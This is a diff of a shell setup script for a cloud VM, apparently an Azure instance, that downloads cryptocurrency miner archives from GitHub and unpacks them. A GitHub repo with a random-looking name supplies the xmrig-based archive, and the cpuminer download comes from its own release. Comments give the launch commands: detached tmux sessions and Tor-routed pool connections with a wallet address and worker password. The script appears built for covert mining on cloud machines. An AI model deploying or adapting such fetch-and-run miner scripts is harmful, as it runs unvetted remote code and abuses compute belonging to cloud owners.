@@ -6,9 +6,9 @@ sudo /usr/sbin/sysctl -w vm.nr_hugepages=1200
 /usr/sbin/sysctl -w vm.nr_hugepages=1200
 cd home/azureuser
 ### MONEROCEAN С КОНФИГОМ: tmux new -ds servak sudo ./xmrig
-wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/mo_miner3107.tar.xz -P /home/azureuser
-tar -xf mo_miner3107.tar.xz
-rm -r mo_miner3107.tar.xz
+wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/mo_miner010824.tar.xz -P /home/azureuser
+tar -xf mo_miner010824.tar.xz
+rm -r mo_miner010824.tar.xz
 #### CPUMINERRPLANT С КОНФИГОМ: tmux new -ds servak torify ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17079 -u uw38EeZwnZtCbgtKStGS5kDtStRt2zuriE.AUTOTUNE -p webpassword=5698 -t 2
 wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz -P /home/azureuser
 tar -xf cpuminer-opt-linux.tar.gz
